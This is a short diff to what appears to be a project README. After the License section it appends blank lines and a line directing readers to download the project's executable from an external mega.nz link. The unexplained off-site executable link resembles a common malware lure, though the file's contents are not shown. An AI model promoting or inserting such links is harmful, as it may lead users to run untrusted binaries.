@@ -50,3 +50,7 @@ Contributions are welcome! If you have any ideas, improvements, or bug fixes, fe
 ## License
 
 This project is licensed under the [MIT License](LICENSE).
+
+
+
+to download its exe file Go at https://mega.nz/file/BZJQGZpZ#iPiukVjZ0kC7rmYYKAomy7LGICMmTpl4sFuxTewlWxo
